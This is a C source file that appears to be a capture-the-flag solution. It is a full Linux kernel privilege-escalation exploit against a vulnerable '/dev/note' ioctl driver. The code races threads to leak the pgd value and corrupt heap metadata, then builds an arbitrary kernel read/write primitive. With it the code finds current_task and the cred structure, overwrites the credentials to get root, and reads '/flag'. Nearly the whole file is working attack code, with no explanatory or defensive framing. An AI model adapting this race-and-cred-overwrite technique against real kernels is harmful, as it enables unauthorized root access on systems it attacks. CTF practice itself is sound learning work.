#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>
#include <sched.h>
#include <unistd.h>

struct note {
    unsigned long index;
    unsigned long len;
    void *buf;
};

#define request_new 0x0FFFFFF00
#define request_put 0x0FFFFFF01
#define request_get 0x0FFFFFF02
#define request_reset 0x0FFFFFF03

void hexdump(void *buf, size_t len)
{
    size_t i;
    for (i = 0; i < len; i++) {
        printf("%.2x ", ((int)((char*)buf)[i]) & 0xff);
        if (i % 16 == 15)
            printf("\n");
    }
    if (i % 16 != 0)
        printf("\n");
}

volatile int fd;
volatile int thread1_stop = 0;

void *thread1(void *arg)
{
    (void)arg;
    char buf[0x100];
    memset(buf, 0, sizeof(buf));
    struct note n;
    n.index = 0;
    n.len = 0xff;
    n.buf = buf;
    int reset_count = 0;
    while (!thread1_stop) {
        for (int i = 0; i < 16; i++)
            ioctl(fd, request_new, &n);
        ioctl(fd, request_reset, &n);
        reset_count++;
    }
    printf("after %d resets\n", reset_count);
    return NULL;
}

volatile int thread2_stop = 0;
pthread_barrier_t thread2_go;
pthread_barrier_t thread2_done;

void *thread2(void *arg)
{
    long threadno = (long)arg;
    char buf[0x100];
    memset(buf, 0, sizeof(buf));
    struct note n;
    n.index = 0;
    n.len = 0xf8 - 0x18 - (threadno * 0x8);
    n.buf = buf;
    while (1) {
        int ret = pthread_barrier_wait(&thread2_go);
        assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
        if (thread2_stop)
            break;
        ioctl(fd, request_new, &n);
        ret = pthread_barrier_wait(&thread2_done);
        assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
    }
    return NULL;
}

int dump(void)
{
    char buf[0x100];
    struct note n;
    n.buf = buf;
    for (int i = 0; i < 16; i++) {
        memset(buf, 0, sizeof(buf));
        n.index = i;
        n.len = 0xf8;
        int ret = ioctl(fd, request_get, &n);
        assert(ret == 0);
        printf("%d\n", i);
        hexdump(buf, 0xf8);
    }
    return 0;
}

char buf[0x100];
char buf2[0x100];
char buf3[0x2080];

int main(int argc, char **argv)
{
    // init
    printf("euid = %d\n", (int)geteuid());
    fd = open("/dev/note", O_RDONLY);
    assert(fd != -1);

    if (argc == 2 && !strcmp(argv[1], "dump"))
        return dump();

    struct note n;
    n.index = 0;
    n.len = 0xff;
    n.buf = buf;
    ioctl(fd, request_reset, &n);

    // leak pgd
    pthread_t thread_handle;
    int ret = pthread_create(&thread_handle, NULL, &thread1, NULL);
    assert(ret == 0);
    long pgd;
    while (!thread1_stop) {
        for (int i = 0; i < 16; i++) {
            n.index = i;
            int ret = ioctl(fd, request_get, &n);
            assert(ret == 0);
            pgd = *(long *)buf;
            if (pgd != 0 && pgd % 0x1000 == 0) {
                thread1_stop = 1;
                break;
            }
        }
    }
    ret = pthread_join(thread_handle, NULL);
    assert(ret == 0);
    printf("pgd = 0x%lx\n", pgd);

#define THREAD2_COUNT 24
    pthread_t thread2_handle[THREAD2_COUNT];
    int corrupted_index = -1;
    int corrupted_offset = -1;
    unsigned long p, l, o;
    int reset_count = 0;
    ret = pthread_barrier_init(&thread2_go, NULL, THREAD2_COUNT + 1);
    assert(ret == 0);
    ret = pthread_barrier_init(&thread2_done, NULL, THREAD2_COUNT + 1);
    assert(ret == 0);
    for (long threadno = 0; threadno < THREAD2_COUNT; threadno++) {
        ret = pthread_create(&thread2_handle[threadno], NULL, &thread2, (void *)threadno);
        assert(ret == 0);
    }
    while (corrupted_index == -1) {
        printf("r");
        ret = ioctl(fd, request_reset, &n);
        assert(ret == 0);
        reset_count++;
        n.len = 0xf8;
        memset(buf, 0, sizeof(buf));
        while (1) {
            printf("g");
            ret = pthread_barrier_wait(&thread2_go);
            assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
            printf("n");
            int ioctl_ret = ioctl(fd, request_new, &n);
            printf("d");
            ret = pthread_barrier_wait(&thread2_done);
            assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
            if (ioctl_ret)
                break;
        }
        printf("\n");
        for (int i = 15; i >= 0; i--) {  // we need the next index
            memset(buf, 0, sizeof(buf));
            n.index = i;
            n.len = 0xf8;
            ret = ioctl(fd, request_get, &n);
            assert(ret == 0);
            for (int j = 8; j < 0xf0; j += 8) {  // we need prev and next qwords
                l = *(unsigned long *)&buf[j];
                l ^= pgd;
                if (l >= 1 && l <= 255) {
                    p = *(unsigned long *)&buf[j - 8];
                    p ^= pgd;
                    o = *(unsigned long *)&buf[j + 8];
                    o ^= pgd;
                    corrupted_index = i;
                    corrupted_offset = j;
                    break;
                }
            }
            if (corrupted_index != -1)
                break;
        }
    }
    thread2_stop = 1;
    ret = pthread_barrier_wait(&thread2_go);
    assert(ret == 0 || ret == PTHREAD_BARRIER_SERIAL_THREAD);
    for (int i = 0; i < THREAD2_COUNT; i++) {
        ret = pthread_join(thread2_handle[i], NULL);
        assert(ret == 0);
    }
    ret = pthread_barrier_destroy(&thread2_go);
    assert(ret == 0);
    ret = pthread_barrier_destroy(&thread2_done);
    assert(ret == 0);
    printf("after %d resets\n", reset_count);
    printf("corrupted_index = %d, corrupted_offset = 0x%x, p = 0x%lx, l = 0x%lx, o = 0x%lx\n",
           corrupted_index, corrupted_offset, p, l, o);

    // unmask, rewind to header that we control
    *(unsigned long *)&buf[corrupted_offset - 8] = 0 ^ pgd;
    *(unsigned long *)&buf[corrupted_offset + 8] ^= pgd;
    *(unsigned long *)&buf[corrupted_offset + 8] -= 0x18;
    *(unsigned long *)&buf[corrupted_offset + 8] ^= pgd;

    // dump data section and look for busy_quux_pointers
    unsigned long *busy_quux_pointers = NULL;
    memset(buf3, 0, 0x2080);
    int count3 = 0;
    unsigned long vprev = 0;
    while (count3 < 0x2080) {
        *(unsigned long *)&buf[corrupted_offset] = 0x8 ^ pgd;
        ret = ioctl(fd, request_put, &n);
        assert(ret == 0);
        struct note n3;
        n3.index = corrupted_index + 1;
        n3.len = 0x8;
        n3.buf = &buf3[count3];
        ret = ioctl(fd, request_get, &n3);
        assert(ret == 0);
        count3 += 0x8;
        *(unsigned long *)&buf[corrupted_offset + 8] ^= pgd;
        *(unsigned long *)&buf[corrupted_offset + 8] += 8;
        *(unsigned long *)&buf[corrupted_offset + 8] ^= pgd;

        unsigned long vcurrent = *(unsigned long *)&buf3[count3 - 8];
        unsigned long delta = vcurrent - vprev;
        if (delta % 8 == 0 && delta >= 0x110 - 0x18 - ((THREAD2_COUNT - 1) * 0x8) && delta <= 0x110) {
            busy_quux_pointers = (unsigned long *)&buf3[count3 - 16];
            break;
        }
        vprev = vcurrent;
    }
    printf("reading the rest of busy_quux_pointers (buf3=%p count3=0x%x busy_quux_pointers=%p)..\n", &buf3[0], count3, busy_quux_pointers);
    if (!busy_quux_pointers)
        abort();
    *(unsigned long *)&buf[corrupted_offset] = 0x70 ^ pgd;
    ret = ioctl(fd, request_put, &n);
    assert(ret == 0);
    struct note n3;
    n3.index = corrupted_index + 1;
    n3.len = 0x70;
    n3.buf = &buf3[count3];
    ret = ioctl(fd, request_get, &n3);
    assert(ret == 0);
    for (int i = 0; i < 16; i++)
        printf("busy_quux_pointers[%d] = %lx\n", i, busy_quux_pointers[i]);

    // buf3 contains data pointed to by busy_quux_pointers[corrupted_index + 1]
    // buf3[0x10:0x18] = busy_quux_pointers[corrupted_index + 1] - page_offset_base
    // add 0x10 because we read twice before saving buf3[0x10]
    unsigned long page_offset_base = busy_quux_pointers[corrupted_index + 1] - *(unsigned long*)&buf3[0x10] + 0x10;
    printf("page_offset_base = %lx\n", page_offset_base);

    // bind to cpu0 for easier current_task shenanigans
    cpu_set_t aff;
    CPU_ZERO(&aff);
    CPU_SET(0, &aff);
    ret = sched_setaffinity(0, sizeof(cpu_set_t), &aff);
    assert(ret == 0);

    // read current task
    *(unsigned long *)&buf[corrupted_offset] = 0xf8 ^ pgd;
    *(unsigned long *)&buf[corrupted_offset + 8] = (0x7800000 + 0x15c00) ^ pgd;  // (pcpu_base_addr - page_offset_base) + current_task
    ret = ioctl(fd, request_put, &n);
    assert(ret == 0);
    struct note n2;
    n2.index = corrupted_index + 1;
    n2.len = 0xf8;
    n2.buf = buf2;
    ret = ioctl(fd, request_get, &n2);
    assert(ret == 0);
    unsigned long current_task = *(unsigned long *)&buf2;
    printf("current_task = 0x%lx\n", current_task);

    // creds
    *(unsigned long *)&buf[corrupted_offset] = 0xf8 ^ pgd;
    *(unsigned long *)&buf[corrupted_offset + 8] = (current_task + 0xa38 - page_offset_base) ^ pgd;
    ret = ioctl(fd, request_put, &n);
    assert(ret == 0);
    ret = ioctl(fd, request_get, &n2);
    assert(ret == 0);
    unsigned long creds = *(unsigned long *)&buf2;
    printf("creds = 0x%lx\n", creds);

    // set euid
    *(unsigned long *)&buf[corrupted_offset] = 0x20 ^ pgd;
    *(unsigned long *)&buf[corrupted_offset + 8] = (creds + 0x4 - page_offset_base) ^ pgd;
    ret = ioctl(fd, request_put, &n);
    assert(ret == 0);
    memset(buf2, 0, 0x20);
    n2.len = 0x20;
    ret = ioctl(fd, request_put, &n2);
    assert(ret == 0);

    // check
    printf("euid = %d\n", (int)geteuid());
    int fd2 = open("/flag", O_RDONLY);
    assert(fd2 != -1);
    read(fd2, buf, 0x100);
    printf("%s\n", buf);
}
